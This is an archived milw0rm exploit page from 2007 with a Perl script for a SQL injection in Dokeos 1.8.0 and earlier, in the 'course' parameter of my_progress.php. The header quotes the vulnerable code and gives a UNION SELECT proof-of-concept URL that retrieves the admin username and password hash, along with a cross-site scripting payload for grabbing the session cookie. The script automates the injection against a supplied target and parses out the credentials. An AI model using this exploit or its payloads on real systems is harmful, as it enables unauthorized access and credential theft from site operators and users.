<html><head><title>Dokeos <= 1.8.0 (my_progress.php course) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

#################################################################################
#                                        					#
#                    Dokeos &lt;= 1.8.0 SQL Injection Exploit            		#
#                                        					#
# Discovered by: Silentz                            				#
# Payload: Admin Username &amp; Hash Retrieval                    			#
# Website: http://www.w4ck1ng.com                        			#
#                                         					#
# Vulnerable Code (my_progress.php):                         			# 
#                                        					#
#    if(isset($_GET['course'])) {$sqlInfosCourse = &quot;SELECT course.code,    	#
#  course.title,course.db_name,CONCAT(user.firstname,' ',user.lastname ,' / ',  #
#  user.email) as tutor_infos FROM $tbl_user as user,$tbl_course as course INNER#
#  JOIN $tbl_session_course as sessionCourse ON sessionCourse.course_code =     #
#  course.code WHERE sessionCourse.id_coach = user.user_id AND course.code=     #
#  '&quot;.$_GET['course'].&quot;'&quot;;                           				#
#                                        					#
#                                       					#
# PoC: http://victim.com/dokeos/main/auth/my_progress.php?course=-999'         	# 
#      UNION SELECT 0,password,0,username FROM user where user_id = '1'/*    	#
#                                        					#
#                                         					#
# Subject To: magic_quotes_gpc set to off &amp; have an already existant         	# 
#             student/teacher account                        			#
#                                        					#
# GoogleDork: Get your own!                            				#
# Shoutz: The entire w4ck1ng community                        			# 
#                                        					#
# Notes: To obtain SESSION_ID field you can log on and XSS yourself, like so:   #
#                                        					#
#     http://victim.com/dokeos/main/inc/lib/fckeditor/editor/plugins/    	#
#     ImageManager/editor.php?img=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;    	#
#                                        					# 
#     Also, the amount of XSS vulnerabilites in this application is truely    	#
#     unbelievable.                                				#
#                                        					#
################################################################################# 

use LWP::UserAgent;
if (@ARGV &lt; 2){
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;                  Dokeos &lt;= 1.8.0 SQL Injection Exploit\r\n&quot;; 
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;Usage: w4ck1ng_dokeos.pl [PATH] [SESSION_ID]\r\n\r\n&quot;;
print &quot;[PATH] = Path where Dokeos is located\r\n&quot;; 
print &quot;[SESSION_ID] = Session identifier of logged on user\r\n\r\n&quot;;
print &quot;e.g. w4ck1ng_dokeos.pl http://victim.com/dokeos/ cjjjauie95inbmo5fim8m93vo1\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;                     http://www.w4ck1ng.com\r\n &quot;;
print &quot;                            ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
exit();
}

$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;; 
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$cookie = &quot;$ARGV[1];&quot;;
$host = $ARGV[0] . &quot;main/auth/my_progress.php?course=-999' UNION SELECT 0,password,0,username FROM user where user_id = '1'/*&quot;; 

my @cookie = ('Cookie' =&gt; &quot;dk_sid=$cookie;&quot;);
my $res = $b-&gt;get($host, @cookie);

$answer = $res-&gt;content;
if ($answer =~ / - Coach : (.*?)&lt;\/strong&gt;/){
print &quot;-------------------------------------------------------------------------\r\n&quot;; 
print &quot;                  Dokeos &lt;= 1.8.0 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;[+] Admin User : $1\n&quot;; 
}

if ($answer =~/&lt;strong&gt;([0-9a-fA-F]{32}) - Coach :/){
print &quot;[+] Admin Hash : $1\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;                      http://www.w4ck1ng.com\r\n&quot;;
print &quot;                            ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
}

else { 
  print &quot;\nExploit Failed...\n&quot;;
}

# milw0rm.com [2007-05-23]</pre></html>